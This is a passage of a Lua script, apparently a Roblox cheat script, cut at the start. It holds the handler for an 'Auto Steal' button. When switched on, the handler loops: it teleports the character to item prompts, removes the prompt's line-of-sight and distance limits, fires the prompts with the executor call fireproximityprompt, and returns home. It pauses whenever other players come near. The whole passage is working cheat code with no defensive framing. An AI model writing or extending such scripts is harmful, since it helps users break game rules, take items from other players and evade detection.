        StealButton.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
        stealStep = 2
    elseif stealStep == 2 then
        autoStealing = not autoStealing
        if autoStealing then
            StealButton.Text = "Stealing Active... ON 🔥"
            StealButton.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
            
            task.spawn(function()
                while autoStealing do
                    if not homeCFrame then break end
                    if checkNearbyPlayers(rootPart) then
                        rootPart.CFrame = homeCFrame
                        task.wait(2)
                        continue
                    end
                    
                    local prompt, targetPart = findBestPrompt(homeCFrame.Position)
                    if prompt and targetPart then
                        rootPart.CFrame = targetPart.CFrame + Vector3.new(0, 2, 0)
                        task.wait(tpDelay) 
                        
                        prompt.RequiresLineOfSight = false
                        prompt.MaxActivationDistance = 999
                        fireproximityprompt(prompt)
                        
                        task.wait(backDelay)
                        rootPart.CFrame = homeCFrame
                        task.wait(loopDelay) 
                    else
                        task.wait(1.5) 
                    end
                end
            end)
        else
            StealButton.Text = "Activate Auto Steal 🚀"
            StealButton.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
        end
    end
end)

